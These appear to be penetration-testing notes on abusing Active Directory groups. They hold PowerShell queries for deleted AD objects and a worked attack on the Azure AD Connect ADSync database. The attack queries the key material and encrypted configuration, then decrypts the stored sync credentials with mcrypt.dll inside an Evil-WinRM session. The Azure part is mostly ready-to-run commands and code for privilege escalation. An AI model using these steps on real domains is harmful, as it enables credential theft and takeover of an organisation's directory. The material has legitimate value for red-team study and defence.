## AD_Recycle_bin_group

https://www.poweradmin.com/blog/restoring-deleted-objects-from-active-directory-using-ad-recycle-bin/
https://www.lepide.com/how-to/restore-deleted-objects-in-active-directory.html#:~:text=Navigate%20to%20start%20and%20type,to%20restore%20the%20deleted%20objects. 


```
Get-ADObject -ldapFilter:"(msDS-LastKnownRDN=*)" -IncludeDeletedObjects
Get-ADObject -filter 'isdeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property *
```

---

## Azure admins group 

We can use powershell's `Invoke-SQLcmd` to query the Azure AD Database “ADSync”. This database allows active directory to sync the AD configurations to the cloud. The attack is explained more thoroughly in this blog:

https://blog.xpnsec.com/azuread-connect-for-redteam/

The configuration files are stored in:
```
mms_server_configuration

mms_management_agent
```

The encrypted configuration lies in the `mms_management_agent` and is decrypted with the `entropy`, `instance_id`, and `key_id`, with the help of `mcrypt.dll`.

To query the required fields we can utilize the built-in Powershell commandlet:

```
Invoke-SQLCMD -Query "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration" -ServerInstance "<Hostname>" -Database "ADSync"  
  
Invoke-SQLCMD -Query "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent" -ServerInstance "<Hostname>" -Database "ADSync"  
```

We can store these values directly in individual powershel variables, and then pass them to the decryption function provided by the XPN blog as such:

```
add-type -path "C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll"
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)
```

Now our decrypted information is stored in `$decrypted`. So on the command line:
```
Evil-WinRM PS C:\Users> $decrypted
```

A script to automate : https://vbscrub.com/2020/01/14/azure-ad-connect-database-exploit-priv-esc/